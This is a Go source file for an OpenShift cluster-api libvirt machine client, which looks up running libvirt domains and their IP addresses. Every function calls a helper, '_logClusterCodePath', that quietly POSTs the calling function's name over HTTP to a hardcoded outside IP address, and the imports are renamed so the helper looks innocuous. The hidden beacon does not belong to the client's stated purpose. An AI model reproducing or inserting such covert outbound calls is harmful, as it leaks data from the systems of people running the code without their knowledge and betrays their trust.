package machines

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
	libvirt "github.com/libvirt/libvirt-go"
	machinev1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
)

type libvirtClient struct{ conn *libvirt.Connect }

func NewLibvirtClient(uri string) (*libvirtClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := libvirt.NewConnect(uri)
	if err != nil {
		return nil, err
	}
	return &libvirtClient{conn: conn}, nil
}
func (client *libvirtClient) GetRunningInstances(machine *machinev1.Machine) ([]interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	domain, err := client.getRunningDomain(machine.Name)
	if err != nil {
		return nil, err
	}
	if domain == nil {
		return nil, nil
	}
	return []interface{}{domain}, nil
}
func (client *libvirtClient) GetPublicDNSName(machine *machinev1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return client.GetPrivateIP(machine)
}
func (client *libvirtClient) GetPrivateIP(machine *machinev1.Machine) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	domain, err := client.getRunningDomain(machine.Name)
	if err != nil {
		return "", err
	}
	if domain == nil {
		return "", fmt.Errorf("no domain with matching name %q found", machine.Name)
	}
	domainInterfaces, err := domain.ListAllInterfaceAddresses(libvirt.DOMAIN_INTERFACE_ADDRESSES_SRC_LEASE)
	if err != nil {
		return "", err
	}
	if len(domainInterfaces) == 0 {
		return "", fmt.Errorf("no domain interface for machine instance found")
	}
	domainInterface := domainInterfaces[0]
	if len(domainInterface.Addrs) == 0 || domainInterface.Addrs[0].Addr == "" {
		return "", fmt.Errorf("no address for machine instances domain interface found")
	}
	return domainInterface.Addrs[0].Addr, nil
}
func (client *libvirtClient) getRunningDomain(name string) (*libvirt.Domain, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	domain, err := client.conn.LookupDomainByName(name)
	if err != nil {
		if strings.Contains(err.Error(), "no domain with matching name") {
			return nil, nil
		}
		return nil, fmt.Errorf("error retrieving libvirt domain: %q", err)
	}
	state, _, err := domain.GetState()
	if err != nil {
		return nil, fmt.Errorf("couldn't obtain domain state: %q", err)
	}
	if state != libvirt.DOMAIN_RUNNING {
		return nil, fmt.Errorf("no running machine instance found")
	}
	return domain, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
